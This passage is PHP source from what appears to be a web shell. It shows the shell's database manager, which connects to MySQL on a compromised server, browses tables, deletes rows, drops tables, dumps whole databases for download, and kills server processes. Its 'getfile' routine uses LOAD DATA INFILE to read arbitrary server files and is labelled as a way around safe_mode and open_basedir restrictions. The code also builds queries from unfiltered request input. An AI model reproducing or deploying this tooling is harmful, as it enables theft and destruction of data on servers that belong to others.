    if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
  }
  echo "</td></tr><tr>";
  if (!$sql_sock) {
    echo "<td width=\"28%\" height=\"100\" valign=\"top\"><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width=\"90%\" height=1 valign=\"top\">";
    echo "<table width=\"100%\" border=0><tr><td><b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b></td><td><b>Database</b></td></tr><form action=\" $surl \" method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"></td><td><input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_db\" value=\"\" maxlength=\"64\"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type=\"text\" name=\"sql_server\" value=\"localhost\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength=\"6\" size=\"3\"></td><td><input type=\"submit\" value=\"Connect\"></td></tr><tr><td></td></tr></form></table></td>";
  }
  else {
    //Start left panel
    if (!empty($sql_db)) {
      ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_tables($sql_db);
      if (!$result) {echo mysql_smarterror();}
      else {
        echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
        $c = 0;
        while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>+&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
        if (!$c) {echo "No tables found in database.";}
      }
    }
    else {
      ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade>
      <?php
      $result = mysql_list_dbs($sql_sock);
      if (!$result) {echo mysql_smarterror();}
      else {
        ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db">
        <?php
        $c = 0;
        $dbs = "";
        while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
        echo "<option value=\"\">Databases (".$c.")</option>";
        echo $dbs;
      }
      ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form>
      <?php
    }
    //End left panel
    echo "</td><td width=\"100%\">";
    //Start center panel
    $diplay = TRUE;
    if ($sql_db) {
      if (!is_numeric($c)) {$c = 0;}
      if ($c == 0) {$c = "no";}
      echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
      if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
      echo "</b></center>";
      $acts = array("","dump");
      if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
      elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
      elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
      elseif ($sql_tbl_act == "insert") {
        if ($sql_tbl_insert_radio == 1) {
          $keys = "";
          $akeys = array_keys($sql_tbl_insert);
          foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
          if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
          $values = "";
          $i = 0;
          foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
          if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
          $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
        elseif ($sql_tbl_insert_radio == 2) {
          $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
          $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
          $result = mysql_query($sql_query) or print(mysql_smarterror());
          $result = mysql_fetch_array($result, MYSQL_ASSOC);
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
      }
      if ($sql_act == "query") {
        echo "<hr size=\"1\" noshade>";
        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
        if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
        if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>";}
      }
      if (in_array($sql_act,$acts)) {
        ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="act" value="sql">
        <input type="hidden" name="sql_act" value="newtbl">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
        <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
        <input type="text" name="sql_newtbl" size="20">
        <input type="submit" value="Create">
        </form></td>
        <td width="30%" height="1"><b>Dump DB:</b>
        <form action="<?php echo $surl; ?>">
        <input type="hidden" name="act" value="sql">
        <input type="hidden" name="sql_act" value="dump">
        <input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"><input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table>
        <?php
        if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
        if ($sql_act == "newtbl") {
          echo "<b>";
          if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
            echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
          }
          else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
        }
        elseif ($sql_act == "dump") {
          if (empty($submit)) {
            $diplay = FALSE;
            echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
            echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
            $v = join (";",$dmptbls);
            echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
            if ($dump_file) {$tmp = $dump_file;}
            else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
            echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
            echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
            echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
            echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
            echo "</form>";
          }
          else {
            $diplay = TRUE;
            $set = array();
            $set["sock"] = $sql_sock;
            $set["db"] = $sql_db;
            $dump_out = "download";
            $set["print"] = 0;
            $set["nl2br"] = 0;
            $set[""] = 0;
            $set["file"] = $dump_file;
            $set["add_drop"] = TRUE;
            $set["onlytabs"] = array();
            if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
            $ret = mysql_dump($set);
            if ($sql_dump_download) {
              @ob_clean();
              header("Content-type: application/octet-stream");
              header("Content-length: ".strlen($ret));
              header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
              echo $ret;
              exit;
            }
            elseif ($sql_dump_savetofile) {
              $fp = fopen($sql_dump_file,"w");
              if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
              else {
                fwrite($fp,$ret);
                fclose($fp);
                echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
              }
            }
            else {echo "<b>Dump: nothing to do!</b>";}
          }
        }
        if ($diplay) {
    if (!empty($sql_tbl)) {
      if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
      $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
      $count_row = mysql_fetch_array($count);
      mysql_free_result($count);
      $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
      $tbl_struct_fields = array();
      while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
      if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
      $perpage = $sql_tbl_le - $sql_tbl_ls;
      if (!is_numeric($perpage)) {$perpage = 10;}
      $numpages = $count_row[0]/$perpage;
      $e = explode(" ",$sql_order);
      if (count($e) == 2) {
        if ($e[0] == "d") {$asc_desc = "DESC";}
        else {$asc_desc = "ASC";}
        $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
      }
      else {$v = "";}
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
      echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[<b> Structure </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[<b> Browse </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[<b> Dump </b>]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_act == "insert") {
        if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
        if (!empty($sql_tbl_insert_radio)) {  } //Not Ready
        else {
          echo "<br><br><b>Inserting row into table:</b><br>";
          if (!empty($sql_tbl_insert_q)) {
            $sql_query = "SELECT * FROM `".$sql_tbl."`";
            $sql_query .= " WHERE".$sql_tbl_insert_q;
            $sql_query .= " LIMIT 1;";
            $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
            $values = mysql_fetch_assoc($result);
            mysql_free_result($result);
          }
          else {$values = array();}
          echo "<form method=\"POST\"><table width=\"1%\" border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
          foreach ($tbl_struct_fields as $field) {
            $name = $field["Field"];
            if (empty($sql_tbl_insert_q)) {$v = "";}
            echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
            $i++;
          }
          echo "</table><br>";
          echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
          if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
          echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
        }
      }
      if ($sql_tbl_act == "browse") {
        $sql_tbl_ls = abs($sql_tbl_ls);
        $sql_tbl_le = abs($sql_tbl_le);
        echo "<hr size=\"1\" noshade>";
        echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
        $b = 0;
        for($i=0;$i<$numpages;$i++) {
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
          echo $i;
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
          if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
          else {echo "&nbsp;";}
        }
        if ($i == 0) {echo "empty";}
        echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";
        echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>";
        echo "<tr>";
        echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
        for ($i=0;$i<mysql_num_fields($result);$i++) {
          $v = mysql_field_name($result,$i);
          if ($e[0] == "a") {$s = "d"; $m = "asc";}
          else {$s = "a"; $m = "desc";}
          echo "<td>";
          if (empty($e[0])) {$e[0] = "a";}
          if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
          else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}
          echo "</td>";
        }
      echo "<td><font color=\"green\"><b>Action</b></font></td>";
      echo "</tr>";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
       echo "<tr>";
       $w = "";
       $i = 0;
       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
       $i = 0;
       foreach ($row as $k=>$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}
        echo "<td>".$v."</td>";
        $i++;
       }
       echo "<td>";
       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"deleterow\">Delete</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
     }
    }
    else {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "<tr>";
       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
       echo "<td>".$row["Rows"]."</td>";
       echo "<td>".$row["Type"]."</td>";
       echo "<td>".$row["Create_time"]."</td>";
       echo "<td>".$row["Update_time"]."</td>";
       echo "<td>".$size."</td>";
       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      echo "<tr bgcolor=\"000000\">";
      echo "<td><center><b>+</b></center></td>";
      echo "<td><center><b>".$i." table(s)</b></center></td>";
      echo "<td><b>".$trows."</b></td>";
      echo "<td>".$row[1]."</td>";
      echo "<td>".$row[10]."</td>";
      echo "<td>".$row[11]."</td>";
      echo "<td><b>".view_size($tsize)."</b></td>";
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"tbldrop\">Drop</option>";
      echo "<option value=\"tblempty\">Empty</option>";
      echo "<option value=\"tbldump\">Dump</option>";
      echo "<option value=\"tblcheck\">Check table</option>";
      echo "<option value=\"tbloptimize\">Optimize table</option>";
      echo "<option value=\"tblrepair\">Repair table</option>";
      echo "<option value=\"tblanalyze\">Analyze table</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
   if (!empty($sql_act)) {
    echo "<hr size=\"1\" noshade>";
    if ($sql_act == "newdb") {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus") {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars") {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "processes") {
     if (!empty($kill)) {
       $query = "KILL ".$kill.";";
       $result = mysql_query($query, $sql_sock);
       echo "<b>Process #".$kill." was killed.</b>";
     }
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
